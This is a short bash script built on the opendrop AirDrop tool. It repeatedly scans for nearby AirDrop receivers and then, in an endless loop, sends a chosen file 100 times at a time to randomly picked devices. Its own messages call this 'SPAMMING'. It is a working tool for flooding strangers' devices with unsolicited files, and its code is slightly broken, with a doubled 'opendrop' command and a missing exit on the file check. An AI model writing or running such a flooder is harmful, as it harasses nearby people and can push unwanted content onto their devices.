echo PRESS CTRL+C TO EXIT
if [ ! -f $1 ]; then
  echo PERM 1 IS REQUIRED, PLEASE SERVE A FLIE
fi

while true; do
  echo SNIFFING FOR 10 SECONDS, OPEN AIRDROP TAB IN FINDER
  finds=$(timeout 10 opendrop find 2>&1 | awk '{print $3}' | sort -n | tail -n 1)
  echo SPAMMING 100 TIMES
  for ((i=1; i<=100; i++)); do
    opendrop opendrop send -f $1 -r $((RANDOM % finds)) &
  done
done
